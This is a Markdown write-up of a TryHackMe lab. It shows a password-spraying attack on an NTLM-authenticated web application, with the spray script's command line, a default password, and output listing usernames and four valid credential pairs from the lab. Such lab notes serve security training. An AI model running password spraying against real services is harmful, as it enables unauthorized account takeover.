# Network connection
- Added IP of `THMDC` to Network Manger > Advanced Setting > My network(`eth0`) > IPv4 > Additional DNS Server > THMDC IP (10.200.24.101), 1.1.1.1


## Password Spraying
- We will use password Spraying technique for a found password, for e.g., found a default password for new user in OSINT search. 
- In password spraying, unlike brute-forcing, a password is used against different users, this will prevent the account from lockout.
- We will password spray a website `http://ntlmauth.za.tryhackme.com/`
- We already have a custom password spraying script made by the room author .

```
python ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>
```

> <userfile> - Textfile containing our usernames - "usernames.txt"
> <fqdn> - Fully qualified domain name associated with the organisation that we are attacking - "za.tryhackme.com"
> <password> - The password we want to use for our spraying attack - "Changeme123"
> <attackurl> - The URL of the application that supports Windows Authentication - "http://ntlmauth.za.tryhackme.com"

- Started the script and found 4 valid credential pairs

```console
❯ python ntlm_passwordspray.py -u usernames.txt -f za.tryhackme.com -p Changeme123 -a http://ntlmauth.za.tryhackme.com  | tee password_spry.log
[*] Starting passwords spray attack using the following password: Changeme123
[-] Failed login with Username: anthony.reynolds
[-] Failed login with Username: samantha.thompson
[-] Failed login with Username: dawn.turner
[-] Failed login with Username: frances.chapman
[-] Failed login with Username: henry.taylor
[-] Failed login with Username: jennifer.wood
[+] Valid credential pair found! Username: hollie.powell Password: Changeme123
[-] Failed login with Username: louise.talbot
[+] Valid credential pair found! Username: heather.smith Password: Changeme123
[-] Failed login with Username: dominic.elliott
[+] Valid credential pair found! Username: gordon.stevens Password: Changeme123
[-] Failed login with Username: alan.jones
[-] Failed login with Username: frank.fletcher
[-] Failed login with Username: maria.sheppard
[-] Failed login with Username: sophie.blackburn
[-] Failed login with Username: dawn.hughes
[-] Failed login with Username: henry.black
[-] Failed login with Username: joanne.davies
[-] Failed login with Username: mark.oconnor
[+] Valid credential pair found! Username: georgina.edwards Password: Changeme123
[*] Password spray attack completed, 4 valid credential pairs found
```

- Logged on to found this webpage

```html
<html>
  <head>
  </head>
  <body>
    Hello World
  </body>
</html>
```
